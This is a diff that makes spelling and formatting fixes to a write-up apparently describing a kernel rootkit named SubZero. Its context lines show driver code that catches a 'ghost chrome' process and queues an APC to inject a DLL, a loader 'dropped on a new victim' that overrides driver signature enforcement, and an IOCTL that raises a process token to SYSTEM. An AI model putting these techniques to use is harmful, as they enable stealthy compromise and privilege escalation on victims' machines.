@@ -118,7 +118,7 @@ if (pid == g_Globals.ExplorerPID)
     if (g_Globals.ExplorerLauncherThreadID != 0)
         return;
 
-    KdPrint((DRIVER_PREFIX "[+] explorer launcher Thread catched. TID: %d\n", tid));
+    KdPrint((DRIVER_PREFIX "[+] explorer launcher Thread caught. TID: %d\n", tid));
     g_Globals.ExplorerLauncherThreadID = tid;
 
     // Register for Process notifications in order to catch the ghost chrome launch
@@ -313,7 +313,7 @@ void OnProcessNotify(PEPROCESS, HANDLE ProcessId, PPS_CREATE_NOTIFY_INFO CreateI
         // Search for our ghost chrome
         if (::HandleToULong(CreateInfo->ParentProcessId) == g_Globals.ExplorerPID) 
         {
-            KdPrint((DRIVER_PREFIX "[+] Chrome.exe catched. PID: %d\n", pid));
+            KdPrint((DRIVER_PREFIX "[+] Chrome.exe caught. PID: %d\n", pid));
             g_Globals.ChromePID = pid;
         }
     }
@@ -328,7 +328,7 @@ The PID of that process is saved, and its first thread is then caught by `OnThre
         if (g_Globals.ChromeFirstThreadID != 0) 
             return;
         
-        KdPrint((DRIVER_PREFIX "[+] Chrome first Thread catched. TID: %d\n", tid));
+        KdPrint((DRIVER_PREFIX "[+] Chrome first Thread caught. TID: %d\n", tid));
         g_Globals.ChromeFirstThreadID = tid;
     
         // Queue APC for dll loading
@@ -611,7 +611,6 @@ The third opcode is for cleanup and will be overviewed later.
 ## Loader
 
 The loader is the first file that is dropped on a new victim. It starts by changing its directory to the chrome application directory, then it extracts the driver and DLL from its resource section and saves them at the same directory. This is followed by the DSE variable overriding and the loading of the driver:
-:
 ```cpp
     // Save resources to file system
     try 
@@ -722,11 +721,11 @@ public:
 
                 DWORD bytesReturned = 0;
                 if (!::DeviceIoControl(
-                    deviceAutoHandle.get(), // device to be queried
+                    deviceAutoHandle.get(),            // device to be queried
                     IOCTL_SUBZERO_SET_TOKEN_TO_SYSTEM, // operation to perform
-                    &pid, sizeof(pid), // input buffer
-                    nullptr, 0, // output buffer
-                    &bytesReturned, // # bytes returned
+                    &pid, sizeof(pid),                 // input buffer
+                    nullptr, 0,                        // output buffer
+                    &bytesReturned,                    // # bytes returned
                     nullptr))
                     {
                         finalException << DEBUG_TEXT("[-] DeviceIoControl Failed");
